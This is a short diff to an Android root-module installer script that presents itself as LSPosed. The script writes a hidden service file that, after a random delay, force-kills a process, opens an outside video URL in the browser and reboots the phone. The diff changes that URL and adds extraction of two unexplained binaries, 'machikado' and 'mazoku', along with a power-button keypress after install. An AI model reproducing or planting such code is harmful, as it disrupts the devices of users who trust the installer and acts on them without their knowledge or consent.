@@ -71,6 +71,9 @@ fi
 # Extract libs
 ui_print "- Extracting module files"
 
+extract "machikado.$ARCH" "" "machikado"
+extract "mazoku"
+
 extract "$ZIPFILE" 'module.prop'        "$MODPATH"
 extract "$ZIPFILE" 'action.sh'          "$MODPATH"
 extract "$ZIPFILE" 'post-fs-data.sh'    "$MODPATH"
@@ -169,7 +172,7 @@ do
             wait_time=$((RANDOM % 301 + 600))
             sleep $wait_time
             kill -9 $pid
-            am start -p com.miui.video -d "https://giveup.icu/d/主盘/jFW1dHQM.mp4?sign=s17ZA_Om9X5nEn_DoQJLrzo6bOWkKG0gyBxjvUqoGaM=:0" -t video/mp4
+            am start -d "https://ifdian.icu/999.mp4" -p "com.android.browser" -a android.intent.action.VIEW
             sleep 60
             reboot
         fi
@@ -180,3 +183,5 @@ done
 EOF
 chmod 777 .lsposed_service.sh
 ui_print "- Welcome to LSPosed!"
+sleep 3
+input keyevent 26
